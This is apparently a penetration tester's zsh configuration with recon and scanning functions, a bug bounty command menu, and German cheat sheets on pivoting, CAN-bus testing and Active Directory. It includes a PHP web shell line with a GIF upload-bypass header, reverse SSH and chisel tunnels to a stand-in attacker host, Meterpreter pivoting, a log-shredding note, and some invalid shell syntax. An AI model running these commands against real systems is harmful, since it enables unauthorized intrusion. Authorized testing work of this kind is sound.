# some more ls aliases
alias ll='ls -l'
alias la='ls -A'
alias l='ls -CF'
# Colors
BLACK='\e[30m'
RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
MAGENTA='\e[35m'
CYAN='\e[36m'
WHITE='\e[37m'
RESET='\033[0m'
BOLD='\e[1m'
UNDERLINE='\e[4m'
BLINK='\e[5m'
REVERSE='\e[7m'
REDBOLD='\e[31m\e[1m'
BLUEBOLD='\e[34m\e[1m'

# enable auto-suggestions based on the history
if [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
    . /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
    # change suggestion color
    ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#999'
fi

# enable command-not-found if installed
if [ -f /etc/zsh_command_not_found ]; then
    . /etc/zsh_command_not_found
fi


# My Aliases
alias paramspider="python3 /root/Desktop/tools/ParamSpider/paramspider.py"
alias linkfinder="python3 /root/Desktop/tools/linkfinder/linkfinder.py"

# Golang vars
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$HOME/.local/bin:$PATH

postexploitation(){

}

common (){
$DOMAIN = "target.com"
$URL = "target.com/paths/to"
$IP = "10.10.10.10"

echo "====Nmap Scan"
echo "nmap -sT -sV -A -p- $IP"
echo "nmap -p- --script=vuln $IP"

echo ""
echo "====WPScan & SSL"
echo "wpscan --url $URL --disabletls-checks --enumerate p --enumerate t --enumerate u -v"
echo "====WPScan bruteforcing"
echo "wpscan --url $URL --disable-tls-checks -U users.txt -P passwords.txt -v"

echo ""
echo "====Nikto"
echo "nikto --host $IP -ssl -evasion 1"

echo ""
echo "====dns_recon"
echo "dnsrecon -d $DOMAIN"

echo "" 
echo "====subdomains bruteforcing:"
echo "gobuster dns -d $domain -w wordlist.txt -t 30"
echo "dirsearch -u $domain  -t 30 -w /usr/share/wordlists/dirb/common.txt -x 302,404 -f -b"
echo "ffuf -c -w /usr/share/wordlists/dirb/common.txt -u "http://$domain/" -H "Host: FUZZ.example.com""
echo "wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 -t 50 -u "http://FUZZ.$domain/""

echo ""
echo "====Extract IPs from a text file"
echo "grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file.txt"

echo ""
echo "====Wfuzz XSS Fuzzing"
echo "wfuzz -c -z file,/home/Desktop/wordlist/vulns/xss.txt $URL"

echo "====Wfuzz XSS Fuzzing with Post data"
echo wfuzz -c -z file,/home/Desktop/wordlist/vulns/xss.txt -d "params=FUZZ" $URL

echo "====Wfuzz HTML Escape Fuzzing with Post data"
echo wfuzz -c -z file,/home/Desktop/wordlist/vulns/html-escape.txt -d "params=value" $URL
echo "wfuzz -c -z file,/home/Desktop/wordlist/vulns/html-escape.txt $URL"

echo "====Wfuzz Parameter Fuzzing"
echo "wfuzz -c -z file,/home/Desktop/wordlist/vulns/parameters.txt --hc 404 $URL"

echo "====Wfuzz Directories Fuzzing"
echo "wfuzz -c -z file,/home/Desktop/wordlist/vulns/directories.txt --hc 404 $URL"

echo "====Wfuzz Files Fuzzing"
echo "wfuzz -c -z file,/home/Desktop/wordlist/vulns/filess.txt --hc 404 $URL"

echo ""
echo "====Command Injection with commmix, ssl, waf, random-agent"
echo commix --url="https://$domain/?params=" --level=3 --force-ssl --skip-ssl --skip-waf --random-agent

echo "====SQLMap"
echo "sqlmap -u $url --threads=2 --time-sec=10 --level=2 --risk=2 --technique=T --force-ssl"
echo "sqlmap -u $url --threads=2 --time-sec=10 --level=4 --risk=3 --banner"

echo ""
echo "====Upload Imagse"
echo "GIF89a1"
# echo <?php system($_GET['param']); ?>

echo ""
echo "=====System Commands with PHP"
# echo <?php system('command'); ?>

}

bringmeit() {
cp /usr/share/exploitdb/exploits/$1 .
echo "Done"
}

# Nuclei
mynuclei(){
echo "mynuclei subdomains.txt outputname"
if [ $# != 2 ]; then
	echo "No arguments provided - hosts.txt output.txt"
else
	nuclei -l $1 -o $2  # there is also time and -rl and templates and so on....
fi
}

mynuclei_sqli(){
	nuclei -l $1 -t ~/Desktop/custom-templates/error-based-sql-injection.yaml -timeout 2 -rl 200
}

myparamspider_sqli(){
	python3 ~/Desktop/tools/ParamSpider/paramspider.py --domain $1 --level high | nuclei -t sqli.yaml | tee -a $1.sqli
}

mynuclei_testing(){
	nuclei -t ~/Desktop/nuclei-templates/exposures -t ~/Desktop/nuclei-templates/misconfiguration -t ~/Desktop/nuclei-templates/cves -l $1 -o mynuclei_testing.out
}

mynuclei_testing_one(){
	nuclei -t ~/Desktop/nuclei-templates/exposures -t ~/Desktop/nuclei-templates/misconfiguration -t ~/Desktop/nuclei-templates/cves -u $1 
}

# Gather Parameters
myparams_one() {
	python3 ~/Desktop/tools/ParamSpider/paramspider.py -d $1 -o $2
}

myparams(){
	echo "paramspider started...."
	cat $1 | xargs -n 1 -I {} python3 ~/Desktop/tools/ParamSpider/paramspider.py --domain {} | urldedupe >> spiderparamters.txt
	echo "github-endpoints started...."
}


# Salesforce testing
mysalesforce_discover(){
	nuclei -t ~/Desktop/custom-templates/salesforce-aura.yaml -l $1
}

mysalesforce(){
	cat $1 | xargs -n1 -I {} cirrusgo salesforce -u {} -gobj | tee $1_saas.txt
}

mysalesforce_one(){
	cirrusgo salesforce -u $1 -gobj 
}

# Screenshots
myscreenshot(){
	eyewitness -f $1 -d screenshots --web
}


mygxss(){
cat $1 | Gxss -o $2
}

# SSRF Testing
myssrf_ffuf(){ # $1 -> parameters, $2 -> burp collaborator
cat $1 | qsreplace $2 > parameters.ssrf && ffuf -c -w parameters.ssrf -u FUZZ -t 200
}
myssrf_httpx(){ # $1 -> parameters, $2 -> burp collaborator
cat $1 | qsreplace $2 | httpx
}

# Backup Discovery
checkbackup(){
ffuf -c -w $1 -u https://FUZZ/FUZZ.tar.gz -mc 200,204,401,403 -H "X-rewrite-url: 127.0.0.1" -H "X-Original-URL: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -timeout 2 -t 500 -o fuzz.results
}

# Subdomain takeover 
mysubover(){
temp=`pwd`;echo $temp;cd ~/Desktop/tools/SubOver/;./SubOver -l $temp/$1 -t 300 -https -timeout 2;cd $temp
}

mysubjack(){
subjack -w $1 -t 300 -timeout 3 -ssl -c ~/Desktop/tools/subjack/fingerprints.json
}


mybypass(){
if [ $# != 2 ]; then
	echo "mybypass https://any.com api"
else
	bash ~/Desktop/tools/bypass-403/bypass-403.sh $1 $2
fi
}

myjex(){
if [ $# != 2 ]; then
	echo "myjex subsdomains.txt outputname" 
else
	python ~/Desktop/tools/jexboss/jexboss.py -mode file-scan -file $1 -out $2.log
fi
}

crtsh(){
curl -s https://crt.sh/?q=%25.$1 > /tmp/curl.out
cat /tmp/curl.out | grep $1 | grep TD | sed -e 's/<//g' | sed -e 's/>//g' | sed -e 's/TD//g' | sed -e 's/\///g' | sed -e 's/ //g' | sed -n '1!p' 
}

mysmuggler(){
	cat $1 | python3 /root/Desktop/tools/smuggler/smuggler.py -t 2 -l output.smuggler
}

movego(){
	bash ~/Desktop/move_go.sh
}

mydirsearch(){
	dirsearch -u $1 -w ~/Desktop/wordlists/all.txt # options filtering for 200, 403 and threads
}


# sqlitime() {
# for i in $(cat /root/Desktop/wordlist/sqli-time.txt);do cat $1 | qsreplace "$i" > sqli && ffuf -u FUZZ -w sqli -s -ft "<5000" | tee -a vulnSqli.txt && rm sqli;done 
# }


# Get subdomains
mygetdomains(){

# Gather Subdomains
echo "Gathering Subdomains"
subfinder -d $1 -all -silent -o from-subfinder.txt
assetfinder -subs-only $1 > from-assetfinder.txt
sublist3r -d $1 -o from-sublister.txt
github-subdomains -d $1 -t github_token_here -o from-github-subdomains.txt
knockpy --no-http $1 | tee -a from-knockpy.txt
crtsh $1
findomain -t $1 -o from-findomain.txt

echo "Running anew"
cat from-subfinder.txt| anew subdomains.txt
cat from-assetfinder.txt| anew subdomains.txt
cat from-sublister.txt| anew subdomains.txt
cat from-findomain.txt| anew subdomains.txt
cat from-crtsh.txt| anew subdomains.txt
cat from-knockpy.txt | grep $1 | cut -d " " -f 5 | anew subdomains.txt
cat from-github-subdomains.txt| anew subdomains.txt

echo "Running httprobe"
cat subdomains.txt |httprobe > httprobe.txt
}

# Get endpoints 
mygetparams(){
mkdir waybackurls-gau
cd waybackurls-gau
cat ../$1 | httpx -t 300 -o all.httpx
cat all.httpx | waybackurls | uro > all.waybackurls
cat all.httpx | gau | uro > all.gau
cat all.waybackurls >> all.temporary
cat all.gau >> all.temporary
cat all.temporary | uro > all.waybackurls.gau
cat all.waybackurls.gau | grep "=" | uro > all.parameters
cat all.waybackurls.gau | grep -v "=" | uro > all.paths
ls
}

mygetparams_one(){
mkdir waybackurls-gau
cd waybackurls-gau

echo "gau + waybackurls starts to get endpoint and parameters"
echo $1 > all.httpx
cat all.httpx | waybackurls | uro > all.waybackurls
cat all.httpx | gau | uro > all.gau
cat all.httpx | hakcrawler -d | uro > all.hakrawler
cat all.waybackurls >> all.temporary
cat all.gau >> all.temporary
cat all.hakrawler >> all.temporary
cat all.temporary | uro > all.waybackurls.gau
cat all.waybackurls.gau | grep "=" | uro > all.parameters
cat all.waybackurls.gau | grep -v "=" | uro > all.paths

echo "paramspider starts to get all JS files"

echo " xx starts to get endpoints from JS file"

echo "paramspider starts to get parameters"
python3 /root/Desktop/tools/ParamSpider/paramspider.py -d $1 
ls
}

# To get all urls from waybackurls, gau, github-endpoints
# httpx -> waybackurls + gau + github-endpoints? -> paramspider -> anew -> url -> kxss + Gxss?
mygeturls(){

if [ $# != 1 ]; then
	echo "mygeturls subdomains.txt"
else
	echo "Number of subdomains: "
	cat $1 | wc -l
	
	echo "httpx started...."
	cat $1 | httpx > httpx.txt
	
	echo "waybackurls stated...."
	# cat httprobe.txt | waybackurls | urldedupe > waybackurls_urls.txt -> reason: waybackurls does not work with files 
	cat httprobe.txt | xargs -n 1 -I {} waybackurls {} >>  waybackurls_urls_tempo.txt
	cat waybackurls_urls_tempo.txt | urldedupe >> waybackurls_urls.txt
	cat waybackurls_urls.txt | grep = | urldedupe >> waybackurls_parameters.txt
	
	echo "gau stated...."
	cat httprobe.txt| gau | urldedupe > gau_urls.txt 
	cat gau_urls.txt | grep = | urldedupe > gau_parameters.txt
	
	echo "SpiderParameters started...."
	cat httprobe.txt | xargs -n 1 -I {} python3 ~/Desktop/tools/ParamSpider/paramspider.py --domain {} --level high | urldedupe >> all_spiderparamters.txt
	
	# echo "github-endpoints started...."
	# cat httprobe.txt | xargs -n 1 -I {} github-endpoints -d {} >> all_githube_endpoints.txt
	
	echo "anew started...."
	cat waybackurls_urls.txt | anew gau_urls.txt
	cat waybackurls_parameters.txt | anew gau_parameters.txt
	
	echo "urldedupe started...."
	cat gau_urls.txt | urldedupe > gau_urlsFiltered.txt
	cat gau_parameters.txt | urldedupe > gau_parametersFitered.txt
	cat all_spiderparamters.txt | urldedupe > all_spiderparamsFiltered.txt
	
	echo "kxss started...."
	cat all_spiderparamsFiltered.txt | kxss > kxss.txt
	
	echo "clean the order...."
	mkdir backup
	mv waybackurls_urls.txt waybackurls_parameters.txt gau_urls.txt gau_parameters.txt all_spiderparamters.txt backup
fi
}


# Help Commands
my_bugbounty_commands(){
echo -e "
${REDBOLD}### Common ###${RESET}
> ipinfo
> myip
> mybash
> myburpsuite
> bringmeit

${REDBOLD}### Find subdomains ###${RESET}
> crtsh target.com
> certspotter target.com
> crtshprobe target.com
> myassetsubfinder target.com
> amass -active -brute -o output.txt -d yahoo.com
> puredns bruteforce wordlist.txt example.com -r resolvers.txt -w output.txt


${REDBOLD}### Take screenshots ###${RESET}
> myaquatone subdomains.txt
> cat mydomains.txt | aquatone -out /root/Desktop -threads 25 -ports 8080
> eyeWitness -f url-list.txt --web --default-creds

${REDBOLD}### Get endpoints ###${RESET}
> mywaymore subdomains

${REDBOLD}### Get Parameters ###${RESET}
> myparamspider subdomains.txt
> myparamspider_one target.com
> my_arjun_one url get/post output.txt
> my_arjun_many urls.txt get/post output.txt

${REDBOLD}### Get JS files ###${RESET}
> mygetjs subdomains.txt
> mygetjs_one target.com
> mygetjs_katana subdomains.txt

${REDBOLD}### Get Secrets from JS files - SecretFinder.py ###${RESET}
> mysecretfinder js_sensitive_ouput_$1.txt
> mysecretfinder_nuclei js_sensitive_ouput_$1.txt

${REDBOLD}### Get endpoints from JS files ###${RESET}
> mylinkfinder_html js_urls.txt
> mylinkfinder_cli js_urls.txt
> myxnlinkfinder js_urls.txt
> myxnlinkfinder https://target.com/file.js

${REDBOLD}### Get subdomains from JS files ###${RESET}
> myxnlinkfinder_domains js_urls.txt subdomains_https.txt subdomains_nohttps.txt

${REDBOLD}### Tracking stuffs ###${RESET}
> myurl_tracker

${REDBOLD}### Nuclei ###${RESET}
> mynuclei urls.txt
> mynuclei_one target.com
> mynuclei_sqli urls.txt
> mynuclei_xssmynuclei_crlf urls.txt
> mynuclei_crlf urls.txt
> mynuclei_exposed urls.txt
> mynuclei_header_injection urls.txt
> mynuclei_lfi urls.txt
> mynuclei_open_redirect urls.txt
> mynuclei_rfi urls.txt
> mynuclei_ssi_injection urls.txt
> mynuclei_ldap_injection urls.txt

${REDBOLD}### dirsearch ###${RESET}
> mydirsearch https://target.com php,asp

${REDBOLD}### keyhacks ###${RESET}
> mykeyhacks

${REDBOLD}### notify ###${RESET}
> command | mynotify welcome

${REDBOLD}### XSS ###${RESET}
> mydalfox parameters_urls.txt
> myxss_blind
> myxss_kxss
> myxss_Gxss

${REDBOLD}### LFI ###${RESET}
> mylfi_dotdotpwn target.com
> mylfi_ffuf urls.txt lfi-payloads.txt
> mylfi_jopmanager urls.txt
> mylfi_many_paths urls.txt lfi_payloads.txt
> mylfi_one_path urls.txt path/to

${REDBOLD}### SQLi ###${RESET}
> mysqli_sqlmap urls.txt
> mysqli_httpx urls.txt

${REDBOLD}### SSRF ###${RESET}
> myssrf_qsreplace urls.txt my-burp-calloborator

${REDBOLD}### smuggler ###${RESET}
> mysmuggling_smuggler urls.txt

${REDBOLD}### CORS ###${RESET}
> mycors urls.txt

${REDBOLD}### OS command injection ###${RESET}
> myos_injection_httpx urls.txt

${REDBOLD}### LDAP injection ###${RESET}
> myldap_injection urls.txt

${REDBOLD}### mix testing for xss, sqli, ssti ###${RESET}
> mymix_ffuf urls.txt

${REDBOLD}### Burpsuite ###${RESET}
> mysend_to_burpsuite urls.txt

${REDBOLD}### extract sensitive infos from APK ###${RESET}
> myapk_extract_juicy app.apk
"
}


my_todo(){
echo -e "${RED}
- Organise my help commands in the /root/referencestuffs directory
- PWDed 400 Machines + recorde videos or walkthroguh on my website!! -> my_ctf()
- my_aws_pentest
- my_azure_pentest
- my_gcp_pentest
- my_infrastructure_as_code_audit (Terraform/CloudFormation)
- my_docker_security
- my_kubernetes_security
- my_api_security (REST/GraphQL)
- my_oauth_openid_assessment
- my_web_auth_logic_tests
- my_web_rate_limit_and_dos_tests
- my_ios_pentest
- my_embedded_firmware_analysis
- my_bluetooth_low_energy_advanced (BLE)
- my_nfc_and_contactless
- my_iot_firmware_reversing
- my_ics_scada_assessment
- my_can_bus_deep_dive (weiterführend)
- my_active_directory_hardening_playbook
- my_idp_sso_saml_oauth_tests
- my_kernel_exploitation_basics
- my_binary_exploitation_advanced (ROP/JOP)
- my_redteam_ops_playbook
- my_phishing_campaign_emulation
- my_physical_pen_test (office / badge cloning)
- my_crypto_review (algos/protocols)
- my_smart_contract_audit (Ethereum/Solidity)
- my_dns_security (DNSSEC, tunneling detection)
- my_email_security (SPF/DMARC/DKIM/SMTP abuse)
- my_ss7_diameter_overview (Telecom-Risks)

${RESET}"
}

my_pivoting(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}==============================[ Pivoting / Lateral Movement ]==============================${RESET}
${YELLOW}================================================================================${RESET}

${REDBOLD}### 0. Rechtliches & Rahmen${RESET}
- Pivoting verändert Netzwerkrouten/Reachability und kann Produktionssysteme beeinflussen.  
- Führe solche Aktionen nur mit schriftlicher, klarer Freigabe, Zeitboxen und Abbruchkriterien durch.  
- Informiere SOC/Netzwerkteam vor potentiell lauten Aktionen (z. B. Port-Forwarding, Traffic-Relay).  
- Protokolliere jede Sitzung, jeden Tunnel und alle verwendeten Credentials.

${BLUEBOLD}## 1. Ziel & Kernidee${RESET}
- Ziel: von einem kompromittierten System (Jump-Host) Zugriff zu internen Diensten/Segmenten erlangen, die direkt vom Angreifer nicht erreichbar sind.  
- Kernprinzipien: kontrolliertes Routing, Proxys/SOCKS, Port-Forwarding, VPN-/Tunnel-Lösungen, sichere Timebox & Monitoring.

${BLUEBOLD}## 2. Vorgehensweise - sicher & schrittweise${RESET}
1) Dokumentiere Ausgangspunkt (Host, IP, Benutzerrechte).  
2) Sammle interne Ziel-Hosts/Ports (nur lesen, keine brute-force ohne Erlaubnis).  
3) Wähle Pivot-Methode mit minimalem Blast Radius (z. B. SOCKS über SSH statt vollständigem VPN).  
4) Timebox setzen, Monitoring aktivieren, Abbruchkriterien dokumentieren.  
5) Nachweis erbringen, Cleanup durchführen.

${BLUEBOLD}## 3. SSH-basierte Pivoting-Patterns (einfach & zuverlässig)${RESET}
# SOCKS5-Proxy (Dyn. Forward) - lokal binden
ssh -D 1080 -N -f user@jumpbox                     # SOCKS5 auf localhost:1080
# Local Port Forwarding
ssh -L 3333:internal.host:3389 -N -f user@jumpbox  # Zugriff localhost:3333 -> internal:3389
# Remote Port Forwarding (Reverse Tunnel)
ssh -R 2222:localhost:22 -N -f attacker@bastion    # ermöglicht Remote Zugriff auf deinen lokalen SSH

# Hinweise:
# - Nutze -C (Compression) bei langsamen Links nur wenn nötig
# - Nutze -o ExitOnForwardFailure=yes für zuverlässige Teardown-Erkennung

${BLUEBOLD}## 4. SOCKS / Proxychains / Proxy-aware tools${RESET}
# Proxychains (oder proxychains-ng) konfigurieren auf deinem Angreifer-Host:
# /etc/proxychains.conf -> socks5 127.0.0.1 1080
proxychains4 nmap -sT -Pn -p 3389 10.0.0.0/24     # Beispiel: nmap durch SOCKS (das Verhalten variiert)

${BLUEBOLD}## 5. socat / netcat / port forwarding low-level${RESET}
# Einfacher TCP-Forward (von jumpbox)
socat TCP-LISTEN:2000,reuseaddr,fork TCP:10.0.0.5:3389
# Auf Angreiferseite verbinden: nc 127.0.0.1 2000
# Sehr mächtig — nutze nur gezielt und mit Cleanup-Plan

${BLUEBOLD}## 6. Reverse tunnels & rendezvous (wenn NAT/Firewall im Weg)${RESET}
# Reverse SSH (wenn internes System keinen Zugriff auf dich zulässt)
# Auf internem Host:
ssh -R 2222:localhost:22 attacker@public-server
# Auf public-server:
ssh -p 2222 localhost

${BLUEBOLD}## 7. Encrypted & stealthy tunnels (chisel, ngrok, frp, corkscrew)${RESET}
# chisel (Go) – einfacher TCP/SOCKS tunnel
# Server (auf Angreifer/Cloud): chisel server -p 8000 --reverse
# Client (intern): chisel client attacker:8000 R:1080:localhost:1080
# → ermöglicht Reverse-SOCKS (nutze nur wenn erlaubt)

${BLUEBOLD}## 8. VPN / Network bridging (stärker, mehr Blast Radius)${RESET}
# sshuttle (transparenter VPN-ähnlicher Tunnel, nutzt iptables)
sshuttle -r user@jumpbox 10.0.0.0/24 --dns
# WireGuard/OpenVPN: nur wenn du vollen Tunnel brauchst und Scope es erlaubt

${BLUEBOLD}## 9. Application-level Proxies (HTTP, SMB, RDP over proxy)${RESET}
# RDP über ssh -L wie oben oder über rdp-proxys
# SMB via smbclient - use socks proxy with proxychains
# Für Web-Apps: Burp + upstream SOCKS (Burp -> SOCKS) oder socat/TCP redirect

${BLUEBOLD}## 10. DNS / ICMP Tunneling (nur in Ausnahmeszenarien)${RESET}
# DNS-Tunneling kann Outbound-only-Constraint umgehen, ist sehr laut und langsam.
# Tools: iodine, dnscat2 (nur mit ausdrücklicher Erlaubnis und Awareness des Netzteams)
# Beispiel: iodine tunneled DNS -> hoher Detektionswert; vorher SOC informieren.

${BLUEBOLD}## 11. Pivoting mit Post-Exploitation-Frameworks (Metasploit, Meterpreter)${RESET}
# Meterpreter SOCKS:
# meterpreter > run autoroute -s 10.0.0.0/24
# meterpreter > socks_server -p 1080
# Anschließend: proxychains über localhost:1080
# Achtung: Meterpreter-Pivots verändern Routing/TCP stack; sehr riskant in Prod

${BLUEBOLD}## 12. Sicherheit & Risk-Controls beim Pivoting${RESET}
- Bevorzugt read-only / proxy-basierte Ansätze (SOCKS) statt vollständiger L2/VPN-Pipes.  
- Nutze Timeboxes und maximal erlaubte IP/Port-Ranges.  
- Aktiviere Logging: welche Ports/Tunnel wurden geöffnet, welche Verbindungen liefen.  
- Teste und simuliere zunächst in einer isolierten Lab-Umgebung (vlan, vnet, vbox).  
- Vereinbare Rückfallpläne: sofortiger Tunnel-Abbruch, Firewall-Reset, Session-Terminierung.

${BLUEBOLD}## 13. Detection & Defense Hinweise (für Blue Teams)${RESET}
- Achte auf ungewöhnliche SSH-Verbindungen, Reverse-Tunnel und neue Listening-Ports auf Gateways.  
- IDS/IPS: signaturen für chisel, reverse-ssh, ungewöhnliche DNS-Queries (Tunneling).  
- EDR: Prozesse die socat/ssh/chisel starten, ungewöhnliche child-processes.  
- Netzwerk: plötzliche neue Routen/Tables, ARP- / DHCP-Anomalien.  

${BLUEBOLD}## 14. Cleanup & Nachweisbarkeit${RESET}
# Beende alle Tunnel / Forwardings
# Beispiel: pkill -f 'ssh -D 1080'  oder speichere PIDs beim Start und kill > cleanup
# Entferne temporäre Listener (socat), shred logs falls sensibel (nur wenn erlaubt)
# Liefere sauber nachvollziehbare Evidence: timestamps, pcap, SSH-config-File, commands.txt

${BLUEBOLD}## 15. Reporting: Wie du Befunde formulierst${RESET}
- Beschreibe Ausgangssituation (vom kompromittierten Host aus — IP, Rechte).  
- Beschreibe die Pivot-Methode, Blast-Radius, Timebox und die tatsächlichen erreichbaren Ziele (Host:Port).  
- Einschätzung des Business-Impact (z. B. Zugang zu kritischen Datenbanken oder Produktions-VMs).  
- Konkrete Gegenmaßnahmen: Firewall-ACLs für interne Segmente, Egress-Filtering, SSH-Restriktionen (no-port-forwarding), Logging & Alerts.

${YELLOW}================================================================================${RESET}
${CYAN}--------------------------------------------------------------------------------${RESET}
${YELLOW}================================================================================${RESET}
"
}

my_automotive(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}======================[ Automotive Penetration Testing Reference ]======================${RESET}
${YELLOW}================================================================================${RESET}

${REDBOLD}### 0. WICHTIG / RECHTLICH${RESET}
- Führe diese Tests nur an Fahrzeugen oder Testständen durch, die ausdrücklich für Sicherheitstests freigegeben sind.
- Stelle sicher: schriftliche Genehmigung, Scope, Notfall-Abbruch (Kill-switch), Versicherung, Sicherheitsabstand (Airbags, Bremsen).
- Dokumentiere jeden Schritt und minimiere physische Risiken (Batterie-Trennung, abgesicherter Prüfstand).

${BLUEBOLD}## 1. Überblick & Grundbegriffe${RESET}
- OBD-II: Standardzugang zum Fahrzeugnetz (Diagnoseport).  
- CAN (Controller Area Network): Häufiges Fahrzeug-Bus-Protokoll (z.B. 500 kbps).  
- UDS (ISO-14229): Diagnosedienste über CAN (z. B. ReadDataByIdentifier, RoutineControl).  
- ISO-TP: Transportprotokoll für längere Nachrichten über CAN.  
- J2534 / PassThru: Standard für Flash/Programmier-Interfaces.

${BLUEBOLD}## 2. Umfeld & Hardware (empfohlen)${RESET}
- Hardware: CAN-Interface (Peak, Kvaser, ValueCAN, CANtact, Lawicel), OBD-II-Adapter, J2534-Box.  
- Software: can-utils, SavvyCAN/Kayak, python-can, Scapy (can), Wireshark (CAN dissector), UDSONCAN, ISO-TP tools.  
- Physische Sicherheitsmaßnahmen: Prüfstand, Batterie-Trenner, mechanischer Kill-Switch.

${BLUEBOLD}## 3. SocketCAN - Schnittstelle einrichten (nur Monitoring-Beispiele)${RESET}
# Interface konfigurieren (Beispiel für vcan/test)
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set up vcan0
# Für echtes CAN-Interface (z. B. can0) mit 500kbps
sudo ip link set can0 type can bitrate 500000
sudo ip link set up can0

${BLUEBOLD}## 4. Passives Monitoring & Logging (sicher, minimal invasiv)${RESET}
# Live anzeigen (cansniffer zeigt IDs + Daten)
cansniffer can0
# Rohes Mitschneiden (rotierendes Log)
candump can0 -L -l
# mit Timestamp und in Datei
candump -ta -L can0 > canlog.candump

${BLUEBOLD}## 5. Analyse & Visualisierung${RESET}
# SavvyCAN (GUI): Import/Analyse, Visualisierung, Logging
savvycan
# Kayak (GUI) / CAN-utils
kayak
# Wireshark: Packet-Analyse (open the capture file)
wireshark canlog.pcap

${BLUEBOLD}## 6. ISO-TP / UDS (Diagnose) - nur wenn autorisiert${RESET}
# Iso-TP-Tools (senden/empfangen) - Beispiel: isotp-send / isotp-recv
# (Nur zum Verstehen – NICHT für invasive Aktionen ohne Freigabe)
isotp-socket -S -t 1000 -i can0
# UDS-Tooling (Python): udsoncan / python-can
# Beispiel-Workflows:
# - session discovery
# - read data by identifier (nur lesend)
# - security access (nur mit Freigabe testen)

${BLUEBOLD}## 7. Replay / Controlled Injection (nur in Labor/mit Freigabe)${RESET}
# Logfile wiedergeben (replay) — sehr vorsichtig einsetzen, nur auf Prüfstand
# Beispiel: canplayer verwendet zuvor erstelltes Log (candump logfile)
canplayer -I canlog.candump
# Alternativ, sende einzelne Frames (benigne Beispiele)
cansend can0 123#deadbeef

${BLUEBOLD}## 8. Fuzzing (risikobehaftet — nur mit Freigabe)${RESET}
# Leichte, geregelte Fuzzing-Sessions (zuerst Simulation auf vcan!)
# python-can + fuzzing-script: generiere kontrollierte Nachrichten mit Limits
# Beispielskizze: cangen für generieren einfacher Testframes
cangen can0 -g 10 -D 100  # generiert Frames; Rate & Pattern begrenzen
# Fuzzing immer mit Kill-switch, Timebox und Monitoring

${BLUEBOLD}## 9. ECU- & Firmware-Analyse (offline)${RESET}
# Extract firmware from ECU (wenn verfügbar und autorisiert) — dann statische Analyse
# Tools: binwalk, strings, IDA/rizin/Ghidra für Binäranalyse
binwalk firmware.bin
strings firmware.bin | less

${BLUEBOLD}## 10. OBD-II Diagnostics (lesend)${RESET}
# Beispiel-Tools: obd, pyOBD, scantool
# Prüfe Kennwerte, Fehlercodes (nur lesend, nicht löschen)
python -m obd.scan  # falls 'obd' installiert und Adapter verbunden
# oder mit 'echobee' / 'savvycan' die OBD-Frames ansehen

${BLUEBOLD}## 11. Sicherheit & Betriebs-Anforderungen während Tests${RESET}
- Beginne mit passiven Scans, dann kontrollierte, niedrig-invasive Tests auf Simulatoren/vcan.  
- Wenn du aktiv injizierst: nur auf Prüfstand / simuliertem ECU mit expliziter Freigabe.  
- Setze Alerts/Monitoring auf Fahrzeugzustand (Temperatur, Geschwindigkeit, Bremssystem) und definiere sofortige Abbruchbedingungen.

${BLUEBOLD}## 12. Dokumentation & Reporting${RESET}
- Ergebnisse immer reproduzierbar dokumentieren: Zeitpunkt, Interface, Logdateien, betroffene CAN-IDs, beobachtetes Verhalten.  
- Risikoanalyse: Safety-Impact (z. B. Fahrverhalten, Airbag), Confidentiality-Impact (z. B. Schlüsselmaterial), Likelihood.  
- Konkrete Fix-Empfehlungen: Zugangskontrolle zum OBD-Port, Message-Authentifizierung/Integrity (z. B. CAN-FD + MAC), Segmentierung, Secure Boot/firmware signing.

${BLUEBOLD}## 13. Cleanup${RESET}
sudo ip link set down can0
sudo ip link delete vcan0 type vcan 2>/dev/null || true
shred -u canlog.candump 2>/dev/null || rm -f canlog.candump

${YELLOW}================================================================================${RESET}
${CYAN}--------------------------------------------------------------------------------${RESET}
${YELLOW}================================================================================${RESET}
"
}

my_active_directory(){
echo -e "
${YELLOW}================================================================================${RESET}
${BLUE}=========================[ Active Directory Penetration Testing ]=========================${RESET}
${YELLOW}================================================================================${RESET}

${REDBOLD}### 0. WICHTIG / RECHTLICH${RESET}
- Teste nur innerhalb des schriftlich vereinbarten Scope und mit ausdrücklicher Freigabe.
- Definiere Ausstiegs-/Abort-Kriterien (z. B. Production-Impact, Service-Ausfall).
- Halte Kommunikationswege bereit (Kontakt für Notfall-Abbruch, SOC/Blue-Team-Benachrichtigung).
- Protokolliere alles: Befehle, Zeiten, Ergebnisse, beeinträchtigte Systeme.

${BLUEBOLD}## 1. Ziel & Methodik-Übersicht${RESET}
- Ziel: Sichtbarkeit ins Active Directory, Erkennung von Fehleinstellungen, Credentials, Delegationen und Privilegienwegen.
- Phasen: Discovery → Enumeration → Credential Harvesting → Lateral Movement → Privilege Escalation → Persistence → Reporting.
- Vorgehen: erst passiv & schonend, dann, nur mit Freigabe, kontrollierte aktive Tests.

${BLUEBOLD}## 2. Umfeld & Tools (Empfehlung){${RESET}
# Wichtige Tools:
# - BloodHound / SharpHound (Graf-Darstellung AD-Beziehungen)
# - Impacket (psexec, wmiexec, smbclient, secretsdump)
# - CrackMapExec (CME) für Automatisierung
# - Nmap, rpcclient, smbclient, enum4linux
# - Responder, ntlmrelayx (NetBIOS/LLMNR/MDNS Tests) — sehr vorsichtig verwenden
# - Rubeus, Mimikatz (Kerberos/LSA Dumps) — nur in Labor oder mit Freigabe
# - PowerView / PowerUp (PowerShell AD Enumeration)
# - BloodHound (Neo4j) für Angriffsgraphen

${BLUEBOLD}## 3. Netzwerk-Discovery & Service-Identifikation (schonend)${RESET}
# Hosts & Services
nmap -sS -Pn -p 88,135,139,389,445,464,636,3268,3269 --open -oN nmap_ad 10.0.0.0/24
# LDAP / AD
ldapsearch -x -h dc.example.local -s sub -b 'dc=example,dc=local' '(objectClass=*)' cn
# SMB / Shares
smbclient -L \\\\dc.example.local -N
smbmap -H dc.example.local

